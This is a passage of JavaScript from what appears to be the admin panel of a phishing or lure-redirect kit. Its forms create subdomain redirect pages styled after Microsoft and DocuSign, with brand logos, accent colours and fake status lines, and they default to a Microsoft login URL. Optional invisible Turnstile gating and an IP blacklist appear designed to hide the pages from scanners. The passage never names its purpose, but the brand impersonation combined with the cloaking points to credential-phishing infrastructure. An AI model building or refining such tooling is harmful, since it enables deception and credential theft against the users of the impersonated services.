      '&turnstile_theme=' + encodeURIComponent(o.turnstile_theme || 'auto');
  }
  return ep('redirect-templates/' + encodeURIComponent(slug) + q);
}

function mgRedirFields(o, isEdit) {
  var logos = ['mark', 'microsoft', 'docusign', 'cloud', 'file', 'ring', 'none'];
  function f(id, label, val, hint, type) {
    return '<div class="field"><label>' + label + '</label><input id="' + id + '" data-mgr="' + id + '" type="' + (type || 'text') + '" value="' + esc(val || '') + '">' + (hint ? '<span class="hint">' + hint + '</span>' : '') + '</div>';
  }
  return '' +
    '<div class="row"><div class="field" style="flex:1"><label>Subdomain</label><input id="mgRSub" value="' + esc(o.subdomain || '') + '"' + (isEdit ? ' disabled' : '') + '><span class="hint">https://&lt;sub&gt;.domain</span></div>' +
    '<div class="field" style="flex:2"><label>Target URL</label><input id="mgRUrl" data-mgr="mgRUrl" value="' + esc(o.target_url || '') + '" placeholder="https://login.microsoftonline.com/"></div></div>' +
    '<div class="row"><div class="field"><label>Template</label><select id="mgRTpl">' + (o.templateOptions || '') + '</select></div>' +
    '<div class="field" style="max-width:120px"><label>Delay (s)</label><input id="mgRDelay" data-mgr="mgRDelay" type="number" min="1" max="30" value="' + esc(o.delay || 3) + '"></div>' +
    '<div class="field" style="max-width:150px"><label>Turnstile</label><label class="switch" style="margin-top:6px"><input type="checkbox" id="mgRTs" data-mgr="mgRTs"' + (o.turnstile ? ' checked' : '') + '><span class="track"></span><span class="muted">gate</span></label></div></div>' +
    '<details class="mb14"><summary class="muted" style="cursor:pointer;font-size:12.5px">Turnstile placement</summary>' +
      '<div class="row mt8"><div class="field"><label>Position</label><select id="mgRPos" data-mgr="mgRPos">' +
        ['slot', 'inline', 'overlay', 'center', 'bottom', 'corner'].map(function (x) { return '<option' + (o.turnstile_pos === x ? ' selected' : '') + '>' + x + '</option>'; }).join('') + '</select></div>' +
      '<div class="field"><label>Type</label><select id="mgRType" data-mgr="mgRType">' +
        ['managed', 'non-interactive', 'invisible'].map(function (x) { return '<option' + (o.turnstile_type === x ? ' selected' : '') + '>' + x + '</option>'; }).join('') + '</select></div>' +
      '<div class="field"><label>Theme</label><select id="mgRTheme" data-mgr="mgRTheme">' +
        ['auto', 'light', 'dark'].map(function (x) { return '<option' + (o.turnstile_theme === x ? ' selected' : '') + '>' + x + '</option>'; }).join('') + '</select></div></div>' +
    '</details>' +
    '<div class="row"><div class="field"><label>Brand / wordmark</label><input id="mgRBrand" data-mgr="mgRBrand" value="' + esc(o.brand || '') + '"></div>' +
    '<div class="field" style="max-width:150px"><label>Accent</label><input id="mgRAccent" data-mgr="mgRAccent" value="' + esc(o.accent || '') + '" placeholder="#0067b8"></div>' +
    '<div class="field" style="max-width:170px"><label>Logo</label><input id="mgRLogo" data-mgr="mgRLogo" list="mgLogoList" value="' + esc(o.logo || '') + '" placeholder="or an image URL"><datalist id="mgLogoList">' + logos.map(function (l) { return '<option value="' + l + '">'; }).join('') + '</datalist></div></div>' +
    f('mgRTitle', 'Title', o.title, '') +
    f('mgRSubtitle', 'Subtitle', o.subtitle, '') +
    f('mgRButton', 'Button label', o.button, 'used by templates with a button') +
    '<div class="field"><label>Status lines (one per line)</label><textarea id="mgRMsgs" data-mgr="mgRMsgs" rows="3">' + esc((o.messages || []).join('\n')) + '</textarea></div>' +
    '<div class="field"><label>Preview</label><iframe id="mgPrev" style="width:100%;height:240px;border:1px solid var(--border);border-radius:10px;background:#fff" src="' + (o.previewURL || '') + '"></iframe></div>' +
    '<div class="actions"><button class="btn primary" data-act="' + (isEdit ? 'mg-redir-update' : 'mg-redir-save') + '" data-id="' + (o.id || '') + '">' + (isEdit ? 'Save changes' : 'Create') + '</button></div>';
}

function mgRedirCollect() {
  function v(id) { var e = document.getElementById(id); return e ? e.value.trim() : ''; }
  function c(id) { var e = document.getElementById(id); return e && e.checked; }
  return {
    subdomain: v('mgRSub'), target_url: v('mgRUrl'), delay: parseInt(v('mgRDelay') || '3', 10),
    template: (document.getElementById('mgRTpl') || {}).value || '',
    turnstile: c('mgRTs'), turnstile_pos: v('mgRPos') || 'slot', turnstile_type: v('mgRType') || 'managed', turnstile_theme: v('mgRTheme') || 'auto',
    brand: v('mgRBrand'), title: v('mgRTitle'), subtitle: v('mgRSubtitle'), accent: v('mgRAccent'),
    logo: v('mgRLogo'), button: v('mgRButton'),
    messages: v('mgRMsgs') ? v('mgRMsgs').split('\n') : []
  };
}

var mgPrevT = null;
function mgRedirPreview() {
  clearTimeout(mgPrevT);
  mgPrevT = setTimeout(function () {
    var o = mgRedirCollect();
    var f = document.getElementById('mgPrev');
    if (f) f.src = mgRedirTemplateURL(o.template || 'clean-redirect', o);
  }, 350);
}

function mgNewRedirect(slug) {
  run(async function () {
    var d = await API.get(ep('redirect-templates'));
    if (!d.templates.length) { toast('no templates', 'err'); return; }
    var sel = slug || d.templates[0].slug;
    var opts = d.templates.map(function (t) { return '<option value="' + esc(t.slug) + '"' + (t.slug === sel ? ' selected' : '') + '>' + esc(t.title) + ' (' + esc(t.category) + ')</option>'; }).join('');
    var meta = d.templates.filter(function (t) { return t.slug === sel; })[0] || {};
    var o = {
      template: sel, templateOptions: opts, delay: meta.delay || 3,
      accent: meta.accent || '', logo: meta.logo || '', brand: meta.brand || '',
      title: meta.title_text || '', subtitle: meta.subtitle || '', button: meta.button || '',
      messages: meta.messages || [], turnstile_pos: 'slot', turnstile_type: 'managed', turnstile_theme: 'auto',
      previewURL: mgRedirTemplateURL(sel, { delay: meta.delay || 3, accent: meta.accent, logo: meta.logo, brand: meta.brand, title: meta.title_text, subtitle: meta.subtitle, button: meta.button, messages: (meta.messages || []).join('\n') })
    };
    openModal('New redirect', mgRedirFields(o, false));
    var s = document.getElementById('mgRTpl');
    if (s) s.onchange = mgRedirPreview;
    $$('[data-mgr]').forEach(function (el) { el.addEventListener('input', mgRedirPreview); el.addEventListener('change', mgRedirPreview); });
  });
}

function mgRedirEdit(id) {
  run(async function () {
    var list = await API.get(ep('redirects'));
    var r = list.redirects.filter(function (x) { return x.id === id; })[0];
    if (!r) { toast('not found', 'err'); return; }
    var d = await API.get(ep('redirect-templates'));
    var opts = d.templates.map(function (t) { return '<option value="' + esc(t.slug) + '"' + (t.slug === r.template ? ' selected' : '') + '>' + esc(t.title) + '</option>'; }).join('');
    r.templateOptions = opts;
    r.previewURL = mgRedirTemplateURL(r.template || 'clean-redirect', r);
    openModal('Edit redirect · ' + esc(r.host), mgRedirFields(r, true));
    $$('[data-mgr]').forEach(function (el) { el.addEventListener('input', mgRedirPreview); el.addEventListener('change', mgRedirPreview); });
  });
}

/* blacklist add form */
document.addEventListener('submit', function (e) {
  var f = e.target.closest && e.target.closest('form[data-form="mgbl"]');
  if (!f) return;
  e.preventDefault();
  var ip = f.querySelector('[name=ip]').value.trim();
  run(async function () { await API.post(ep('blacklist'), { ip: ip }); f.reset(); toast('added', 'ok'); mgRefresh(); });
});
document.addEventListener('change', function (e) {
  var el = e.target;
  if (el && el.id === 'mgBlMode') run(async function () { await API.post(ep('blacklist/mode'), { mode: el.value }); toast('mode updated', 'ok'); });
});
`
